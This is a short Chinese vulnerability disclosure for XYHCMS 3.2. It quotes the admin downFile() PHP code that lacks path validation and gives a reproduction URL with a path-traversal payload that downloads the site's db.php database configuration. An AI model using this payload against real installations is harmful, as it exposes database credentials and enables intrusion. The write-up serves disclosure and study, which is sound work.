<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>XYHCMS 3.2 后台任意文件下载</h1><h2>一、漏洞简介</h2><p>没有对下载的文件做任何限制</p><h2>二、漏洞影响</h2><p>XYHCMS 3.2</p><h2>三、复现过程</h2><h3>漏洞分析</h3><p>/App/Manage/Controller/DatabaseController.class.php的downfile()方法</p><p>public function downFile() {  <br />    if (empty($_GET['file']) || empty($_GET['type']) || !in_array($_GET['type'], array(&quot;zip&quot;, &quot;sql&quot;))) {  <br />        $this-&gt;error("下载地址不存在");  <br />    }  <br />    $path     = array(&quot;zip&quot; =&gt; $this-&gt;getDbPath() . &quot;Zip/&quot;, &quot;sql&quot; =&gt; $this-&gt;getDbPath() . '/');  <br />    $filePath = $path[$_GET['type']] . $_GET['file'];  <br />    if (!file_exists($filePath)) {  <br />        $this-&gt;error("该文件不存在，可能是被删除");  <br />    }  <br />     $filename = basename($filePath);  <br />     header("Content-type: application/octet-stream");  <br />     header('Content-Disposition: attachment; filename=&quot;' . $filename . '&quot;');  <br />     header("Content-Length: " . filesize($filePath));  <br />     readfile($filePath);  <br /> }</p><h3>漏洞复现</h3><ol class="pydocx-list-style-type-decimal"><li>登录后台</li><li>访问http://www.0-sec.org/xyhai.php?s=/Database/downFile/file/..\\..\\..\\App\\Common\\Conf\\db.php/type/zip</li><li>下载到数据库配置文件</li></ol></body></html>